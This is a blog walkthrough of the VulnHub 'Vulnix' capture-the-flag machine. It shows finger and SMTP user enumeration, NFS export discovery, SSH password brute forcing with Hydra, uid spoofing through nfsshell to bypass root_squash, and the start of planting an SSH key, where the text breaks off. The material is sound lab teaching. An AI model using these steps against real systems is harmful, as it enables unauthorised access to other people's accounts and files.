
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>HackLAB Vulnix - Core dump overflow</title>
  <meta name="author" content="chousensha">

  
  
  <meta name="description" content="Vulnix writeup">
  <meta name="keywords" content="vulnix, vulnix vulnhub, hacklab, hacklab vulnix, ctf, vulnhub, vulnix walkthrough, vulnix writeup, vulnix solution, smtp-user-enum, smtp user enum, nfs exploit, nfsshell">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://chousensha.github.io/blog/2017/06/20/hacklab-vulnix">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="Core dump overflow" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-51216602-2']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">Core dump overflow</a></h1>
  
    <h2>Core dump in progress...</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:chousensha.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/where-to-start">Where to start</a></li>
  <li><a href="/book-corner">Book corner</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">HackLAB Vulnix</h1>
    
    
      <p class="meta">
        








  


<time datetime="2017-06-20T08:04:29-04:00" pubdate data-updated="true">Jun 20<span>th</span>, 2017</time>
        
           | <a href="#disqus_thread"
             data-disqus-identifier="http://chousensha.github.io">Comments</a>
        
      </p>
    
  </header>


<div class="entry-content"><p>Vulnix is an older machine from VulnHub that intends to present vulnerabilities from a misconfiguration point of view. The goal is to get the flag inside /root</p>

<!-- more -->


<p>Here are the Nmap results:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE    VERSION
</span><span class='line'>22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>25/tcp    open  smtp       Postfix smtpd
</span><span class='line'>79/tcp    open  finger     Linux fingerd
</span><span class='line'>110/tcp   open  pop3?
</span><span class='line'>111/tcp   open  rpcbind    2-4 (RPC #100000)
</span><span class='line'>143/tcp   open  imap       Dovecot imapd
</span><span class='line'>512/tcp   open  exec       netkit-rsh rexecd
</span><span class='line'>513/tcp   open  login
</span><span class='line'>514/tcp   open  tcpwrapped
</span><span class='line'>993/tcp   open  ssl/imap   Dovecot imapd
</span><span class='line'>995/tcp   open  ssl/pop3s?
</span><span class='line'>2049/tcp  open  nfs_acl    2-3 (RPC #100227)
</span><span class='line'>36190/tcp open  status     1 (RPC #100024)
</span><span class='line'>40731/tcp open  mountd     1-3 (RPC #100005)
</span><span class='line'>43539/tcp open  nlockmgr   1-4 (RPC #100021)
</span><span class='line'>46423/tcp open  mountd     1-3 (RPC #100005)
</span><span class='line'>52024/tcp open  mountd     1-3 (RPC #100005)</span></code></pre></td></tr></table></div></figure>


<h3>finger user enumeration</h3>

<p>There are quite a few services listening on the host. One of the first things that grabbed my attention was finger running on port 79. Because of this, we can use finger to perform <a href="https://pentestlab.blog/tag/finger/">user enumeration</a> on the host. We can use Nmap&rsquo;s script scan to see who is logged on the host, or do it manually. Here I will show the manual way:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>finger @192.168.217.142
</span><span class='line'>No one logged on.</span></code></pre></td></tr></table></div></figure>


<p>The same thing can be achieved by running Nmap with the <em>-sC</em> flag. Next I tried to get more information about the root user:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>finger root@192.168.217.142
</span><span class='line'>Login: root                       Name: root
</span><span class='line'>Directory: /root                      Shell: /bin/bash
</span><span class='line'>Never logged in.
</span><span class='line'>No mail.
</span><span class='line'>No Plan.</span></code></pre></td></tr></table></div></figure>


<p>It seems the root user never logged in, but we still obtained the directory and shell that root uses. I tried a few more guesses and discovered a couple more users on the host:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>finger user@192.168.217.142
</span><span class='line'>Login: user                       Name: user
</span><span class='line'>Directory: /home/user                 Shell: /bin/bash
</span><span class='line'>Never logged in.
</span><span class='line'>No mail.
</span><span class='line'>No Plan.
</span><span class='line'>
</span><span class='line'>Login: dovenull                   Name: Dovecot login user
</span><span class='line'>Directory: /nonexistent               Shell: /bin/false
</span><span class='line'>Never logged in.
</span><span class='line'>No mail.
</span><span class='line'>No Plan.
</span><span class='line'>
</span><span class='line'>finger vulnix@192.168.217.142
</span><span class='line'>Login: vulnix                     Name: 
</span><span class='line'>Directory: /home/vulnix               Shell: /bin/bash
</span><span class='line'>Never logged in.
</span><span class='line'>No mail.
</span><span class='line'>No Plan.</span></code></pre></td></tr></table></div></figure>


<h3>SMTP user enumeration</h3>

<p>Since port 25 is open, we can also attempt some enumeration with SMTP. Again, this can be accomplished with an Nmap script, but this time I want to use an utility called <strong>smtp-user-enum</strong>.</p>

<p>Homepage: <a href="http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum">http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum</a></p>

<blockquote><p>smtp-user-enum is a tool for enumerating OS-level user accounts on Solaris via the SMTP service (sendmail).
Enumeration is performed by inspecting the responses to VRFY, EXPN and RCPT TO commands. It could be adapted to
work against other vulnerable SMTP daemons, but this hasn’t been done as of v1.0.</p></blockquote>

<p>Let&rsquo;s see its options:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
</span><span class='line'>
</span><span class='line'>Usage: smtp-user-enum.pl [options] ( -u username | -U file-of-usernames ) ( -t host | -T file-of-targets )
</span><span class='line'>
</span><span class='line'>options are:
</span><span class='line'>        -m n     Maximum number of processes (default: 5)
</span><span class='line'>  -M mode  Method to use for username guessing EXPN, VRFY or RCPT (default: VRFY)
</span><span class='line'>  -u user  Check if user exists on remote system
</span><span class='line'>  -f addr  MAIL FROM email address.  Used only in "RCPT TO" mode (default: user@example.com)
</span><span class='line'>        -D dom   Domain to append to supplied user list to make email addresses (Default: none)
</span><span class='line'>                 Use this option when you want to guess valid email addresses instead of just usernames
</span><span class='line'>                 e.g. "-D example.com" would guess foo@example.com, bar@example.com, etc.  Instead of 
</span><span class='line'>                      simply the usernames foo and bar.
</span><span class='line'>  -U file  File of usernames to check via smtp service
</span><span class='line'>  -t host  Server host running smtp service
</span><span class='line'>  -T file  File of hostnames running the smtp service
</span><span class='line'>  -p port  TCP port on which smtp service runs (default: 25)
</span><span class='line'>  -d       Debugging output
</span><span class='line'>  -t n     Wait a maximum of n seconds for reply (default: 5)
</span><span class='line'>  -v       Verbose
</span><span class='line'>  -h       This help message
</span><span class='line'>
</span><span class='line'>Also see smtp-user-enum-user-docs.pdf from the smtp-user-enum tar ball.
</span><span class='line'>
</span><span class='line'>Examples:
</span><span class='line'>
</span><span class='line'>$ smtp-user-enum.pl -M VRFY -U users.txt -t 10.0.0.1
</span><span class='line'>$ smtp-user-enum.pl -M EXPN -u admin1 -t 10.0.0.1
</span><span class='line'>$ smtp-user-enum.pl -M RCPT -U users.txt -T mail-server-ips.txt
</span><span class='line'>$ smtp-user-enum.pl -M EXPN -D example.com -U users.txt -t 10.0.0.1</span></code></pre></td></tr></table></div></figure>


<p>I created a file named users.txt with some usernames to try, and fed it to the script:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# smtp-user-enum -U users.txt -t 192.168.217.142
</span><span class='line'>Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
</span><span class='line'>
</span><span class='line'> ----------------------------------------------------------
</span><span class='line'>|                   Scan Information                       |
</span><span class='line'> ----------------------------------------------------------
</span><span class='line'>
</span><span class='line'>Mode ..................... VRFY
</span><span class='line'>Worker Processes ......... 5
</span><span class='line'>Usernames file ........... users.txt
</span><span class='line'>Target count ............. 1
</span><span class='line'>Username count ........... 6
</span><span class='line'>Target TCP port .......... 25
</span><span class='line'>Query timeout ............ 5 secs
</span><span class='line'>Target domain ............ 
</span><span class='line'>
</span><span class='line'>######## Scan started at Tue Jun 20 09:29:30 2017 #########
</span><span class='line'>192.168.217.142: root exists
</span><span class='line'>192.168.217.142: vulnix exists
</span><span class='line'>192.168.217.142: user exists
</span><span class='line'>192.168.217.142: postmaster exists
</span><span class='line'>192.168.217.142: mail exists
</span><span class='line'>######## Scan completed at Tue Jun 20 09:29:30 2017 #########
</span><span class='line'>5 results.
</span><span class='line'>
</span><span class='line'>6 queries in 1 seconds (6.0 queries / sec)</span></code></pre></td></tr></table></div></figure>


<p>You can see that this is a pretty cool script that can help you enumerate users pretty fast, and now we know more valid user accounts on the system. You can also use it to find valid email addresses instead of accounts, by using the <em>-D</em> option. I tried a few examples, but got no hits.</p>

<p>Moving on, ports 512-514 are fore the old r-utilities, and if misconfigured, could allow remote access to the host. But in this case, the system asked me for root&rsquo;s SSH password, so I couldn&rsquo;t exploit them.</p>

<h3>Exploit NFS</h3>

<p>We&rsquo;ve done some preliminary enumeration on the target, now it&rsquo;s time to return to the results of the Nmap scan. We&rsquo;ve identified the fact that NFS is running on the Vulnix host. I confirmed it with the use of <em>rpcinfo</em>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rpcinfo -p 192.168.217.142
</span><span class='line'>   program vers proto   port  service
</span><span class='line'>    100000    4   tcp    111  portmapper
</span><span class='line'>    100000    3   tcp    111  portmapper
</span><span class='line'>    100000    2   tcp    111  portmapper
</span><span class='line'>    100000    4   udp    111  portmapper
</span><span class='line'>    100000    3   udp    111  portmapper
</span><span class='line'>    100000    2   udp    111  portmapper
</span><span class='line'>    100024    1   udp  39427  status
</span><span class='line'>    100024    1   tcp  42309  status
</span><span class='line'>    100003    2   tcp   2049  nfs
</span><span class='line'>    100003    3   tcp   2049  nfs
</span><span class='line'>    100003    4   tcp   2049  nfs
</span><span class='line'>    100227    2   tcp   2049
</span><span class='line'>    100227    3   tcp   2049
</span><span class='line'>    100003    2   udp   2049  nfs
</span><span class='line'>    100003    3   udp   2049  nfs
</span><span class='line'>    100003    4   udp   2049  nfs
</span><span class='line'>    100227    2   udp   2049
</span><span class='line'>    100227    3   udp   2049
</span><span class='line'>    100021    1   udp  39258  nlockmgr
</span><span class='line'>    100021    3   udp  39258  nlockmgr
</span><span class='line'>    100021    4   udp  39258  nlockmgr
</span><span class='line'>    100021    1   tcp  34418  nlockmgr
</span><span class='line'>    100021    3   tcp  34418  nlockmgr
</span><span class='line'>    100021    4   tcp  34418  nlockmgr
</span><span class='line'>    100005    1   udp  34638  mountd
</span><span class='line'>    100005    1   tcp  52581  mountd
</span><span class='line'>    100005    2   udp  42603  mountd
</span><span class='line'>    100005    2   tcp  53226  mountd
</span><span class='line'>    100005    3   udp  49704  mountd
</span><span class='line'>    100005    3   tcp  47770  mountd</span></code></pre></td></tr></table></div></figure>


<p>If NFS wasn&rsquo;t properly configured, we might have access to shares we wouldn&rsquo;t otherwise be allowed to. There are a couple of ways to list the shares, and I&rsquo;m going to show here some of them. Th easiest way is from the command line, with the <code>showmount -e</code> command:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# showmount -e 192.168.217.142
</span><span class='line'>Export list for 192.168.217.142:
</span><span class='line'>/home/vulnix *</span></code></pre></td></tr></table></div></figure>


<p>Good news! The vulnix home directory is being shared with no restrictions. Before going there, let&rsquo;s see how we can get the same information with Nmap:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sV -p111 --script=nfs-showmount 192.168.217.142
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.40 ( https://nmap.org ) at 2017-06-21 06:00 EDT
</span><span class='line'>Nmap scan report for 192.168.217.142
</span><span class='line'>Host is up (0.00027s latency).
</span><span class='line'>PORT    STATE SERVICE VERSION
</span><span class='line'>111/tcp open  rpcbind 2-4 (RPC #100000)
</span><span class='line'>| nfs-showmount: 
</span><span class='line'>|_  /home/vulnix *
</span><span class='line'>| rpcinfo: 
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2,3,4        111/tcp  rpcbind
</span><span class='line'>|   100000  2,3,4        111/udp  rpcbind
</span><span class='line'>|   100003  2,3,4       2049/tcp  nfs
</span><span class='line'>|   100003  2,3,4       2049/udp  nfs
</span><span class='line'>|   100005  1,2,3      47770/tcp  mountd
</span><span class='line'>|   100005  1,2,3      49704/udp  mountd
</span><span class='line'>|   100021  1,3,4      34418/tcp  nlockmgr
</span><span class='line'>|   100021  1,3,4      39258/udp  nlockmgr
</span><span class='line'>|   100024  1          39427/udp  status
</span><span class='line'>|   100024  1          42309/tcp  status
</span><span class='line'>|   100227  2,3         2049/tcp  nfs_acl
</span><span class='line'>|_  100227  2,3         2049/udp  nfs_acl</span></code></pre></td></tr></table></div></figure>


<p>We can also use the <em>auxiliary/scanner/nfs/nfsmount</em> Metasploit module:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf auxiliary(nfsmount) &gt; run
</span><span class='line'>
</span><span class='line'>[+] 192.168.217.142:111   - 192.168.217.142 NFS Export: /home/vulnix [*]
</span><span class='line'>[*] Scanned 1 of 1 hosts (100% complete)
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>


<p>I mounted the share locally to see what&rsquo;s there. The <em>nolock</em> option disables file locking and it&rsquo;s sometimes required for older NFS servers.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/mnt# mkdir nfs
</span><span class='line'>root@kali:/mnt# mount -t nfs -o nolock 192.168.217.142:/home/vulnix /mnt/nfs</span></code></pre></td></tr></table></div></figure>


<p>However, when I tried to access the newly mounted share, I got permission denied errors. I couldn&rsquo;t <em>chmod</em> or do anything else. After some reading on the interwebz, it seems the likely cause is the <a href="https://www.centos.org/docs/5/html/Deployment_Guide-en-US/s1-nfs-server-config-exports.html">root_squash</a> option, that nullifies the root privileges of the clients accessing the share, and instead gives them the user ID of the nobody user. It seems to be enabled by default on modern NFS implementations, and you can read more about it <a href="http://www.techrepublic.com/article/working-with-nfs/">here</a>.</p>

<p>After some more digging through the interwebz, I found an <a href="https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/">interesting article about nfsshell</a>, which is a userspace NFS client shell. I downloaded it from its <a href="https://github.com/NetDirect/nfsshell">Github page</a>, and to compile I had to install the following <a href="https://www.phillips321.co.uk/2015/09/15/nfsshell-on-kali-linux-2-0/">dependencies</a>: <code>apt-get install libreadline-dev libncurses5-dev</code>. Afterwards, I ran <em>make</em> and it compiled fine. Here are its options:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nfs&gt; help
</span><span class='line'>host &lt;host&gt; - set remote host name
</span><span class='line'>uid [&lt;uid&gt; [&lt;secret-key&gt;]] - set remote user id
</span><span class='line'>gid [&lt;gid&gt;] - set remote group id
</span><span class='line'>cd [&lt;path&gt;] - change remote working directory
</span><span class='line'>lcd [&lt;path&gt;] - change local working directory
</span><span class='line'>cat &lt;filespec&gt; - display remote file
</span><span class='line'>ls [-l] &lt;filespec&gt; - list remote directory
</span><span class='line'>get &lt;filespec&gt; - get remote files
</span><span class='line'>df - file system information
</span><span class='line'>rm &lt;file&gt; - delete remote file
</span><span class='line'>ln &lt;file1&gt; &lt;file2&gt; - link file
</span><span class='line'>mv &lt;file1&gt; &lt;file2&gt; - move file
</span><span class='line'>mkdir &lt;dir&gt; - make remote directory
</span><span class='line'>rmdir &lt;dir&gt; - remove remote directory
</span><span class='line'>chmod &lt;mode&gt; &lt;file&gt; - change mode
</span><span class='line'>chown &lt;uid&gt;[.&lt;gid&gt;] &lt;file&gt; -  change owner
</span><span class='line'>put &lt;local-file&gt; [&lt;remote-file&gt;] - put file
</span><span class='line'>mount [-upTU] [-P port] &lt;path&gt; - mount file system
</span><span class='line'>umount - umount remote file system
</span><span class='line'>umountall - umount all remote file systems
</span><span class='line'>export - show all exported file systems
</span><span class='line'>dump - show all remote mounted file systems
</span><span class='line'>status - general status report
</span><span class='line'>help - this help message
</span><span class='line'>quit - its all in the name
</span><span class='line'>bye - good bye
</span><span class='line'>handle [&lt;handle&gt;] - get/set directory file handle
</span><span class='line'>mknod &lt;name&gt; [b/c major minor] [p] - make device</span></code></pre></td></tr></table></div></figure>


<p>From my reading about NFS and root squashing, it seems that knowing the uid of the share&rsquo;s owner would allow mounting the share as that user and bypassing the access denied errors that I got as root. Because the share is the home folder of the vulnix user, we need to know the uid for that particular user account. But we need local access to the machine to find that out. Well, we did get some usernames from the enumeration stage, so we probably have to attempt a bruteforce attack. From all the discovered usernames, I only kept the user and vulnix ones, because the rest were users for various services on the system. And then I ran Hydra with the recommended task number for SSH:</p>

<p><img class="center" src="/images/pentest/vulnix-hydra.png" title="hydra" alt="letmein"></p>

<p>Hydra found the password for user pretty quickly. I logged in as user, but didn&rsquo;t find anything out of the ordinary. However, I was able to get the uid for the vulnix account:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@vulnix:~$ id vulnix
</span><span class='line'>uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)</span></code></pre></td></tr></table></div></figure>


<p>I went back to nfsshell and made the changes:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nfs&gt; host 192.168.217.142
</span><span class='line'>Using a privileged port (1023)
</span><span class='line'>Open 192.168.217.142 (192.168.217.142) TCP
</span><span class='line'>nfs&gt; uid 2008
</span><span class='line'>nfs&gt; gid 2008
</span><span class='line'>nfs&gt; status
</span><span class='line'>User id      : 2008
</span><span class='line'>Group id     : 2008
</span><span class='line'>Remote host  : `192.168.217.142'
</span><span class='line'>Transfer size: 0</span></code></pre></td></tr></table></div></figure>


<p>Now I was able to access the share:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nfs&gt; ls -l
</span><span class='line'>drwxr-x---  2     2008  2008      4096  Sep  2  2012  .
</span><span class='line'>drwxr-x---  2     2008  2008      4096  Sep  2  2012  ..
</span><span class='line'>drwxr-x---  2     2008  2008      4096  Sep  2  2012  .bash_logout
</span><span class='line'>drwxr-x---  2     2008  2008      4096  Sep  2  2012  .bashrc
</span><span class='line'>drwxr-x---  2     2008  2008      4096  Sep  2  2012  .profile</span></code></pre></td></tr></table></div></figure>


<p>Since this is vulnix&rsquo;s home directory, we can put an SSH key in here to allow remote access. I tried the next steps through nfsshell, but I was limited in the commands I could run. So I created a local vulnix user on my machine, and assigned it the uid 2008: <code>root@kali:~# useradd vulnix -u 2008</code>. Then I generated an SSH key pair from this account:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# su vulnix
</span><span class='line'>$ id
</span><span class='line'>uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
</span><span class='line'>$ cd /tmp
</span><span class='line'>$ ssh-keygen
</span><span class='line'>Generating public/private rsa key pair.
</span><span class='line'>Enter file in which to save the key (/home/vulnix/.ssh/id_rsa): vulnix
</span><span class='line'>Enter passphrase (empty for no passphrase): 
</span><span class='line'>Enter same passphrase again: 
</span><span class='line'>Your identification has been saved in vulnix.
</span><span class='line'>Your public key has been saved in vulnix.pub.
</span><span class='line'>The key fingerprint is:
</span><span class='line'>SHA256:P6FAPt9R/0TbOTtQUhk8SiBUlgAtINciO0mUmr2Nrp4 vulnix@kali
</span><span class='line'>The key's randomart image is:
</span><span class='line'>+---[RSA 2048]----+
</span><span class='line'>|  .o.oo.++o+o .oo|
</span><span class='line'>|   +o. o .o. ..+ |
</span><span class='line'>|  = + o .   o...o|
</span><span class='line'>| o = o     . oo.+|
</span><span class='line'>|    = + S o  ..+o|
</span><span class='line'>|   o . + + o  .oo|
</span><span class='line'>|  .     o +    o.|
</span><span class='line'>|  ..       .    .|
</span><span class='line'>|.E.              |
</span><span class='line'>+----[SHA256]-----+</span></code></pre></td></tr></table></div></figure>


<p>I now navigated without problems to the NFS share, created a .ssh directory and copied the contents of the public key to <em>authorized_keys</em>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
